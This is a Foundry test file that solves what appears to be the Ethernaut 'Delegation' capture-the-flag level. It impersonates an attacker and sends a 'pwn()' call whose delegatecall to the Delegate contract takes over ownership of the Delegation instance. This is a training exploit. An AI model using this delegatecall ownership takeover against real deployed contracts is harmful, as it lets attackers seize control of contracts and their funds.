// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../src/levels/Delegation/Delegation.sol";
import "../src/levels/Delegation/DelegationFactory.sol";

contract DelegationTest is Test {
    DelegationFactory public factory;
    Delegate public delegate;
    Delegation public delegation;
    //  address public player = address(0x01);
    address public attacker = address(0x01);

    function setUp() public {
        factory = new DelegationFactory();
        delegation = Delegation(factory.createInstance(address(0)));
        delegate = Delegate(factory.delegateAddress());

        assertTrue(address(factory) == delegation.owner());
        assertTrue(address(delegation.delegate()) == address(delegate));
    }

    function testDelegationAttack() public {
        emit log_address(delegation.owner());

        vm.startPrank(attacker);
        address(delegation).call(abi.encodeWithSignature("pwn()"));
        vm.stopPrank();

        emit log_address(delegation.owner());

        assertTrue(factory.validateInstance((payable(address(delegation))), attacker));
    }
}
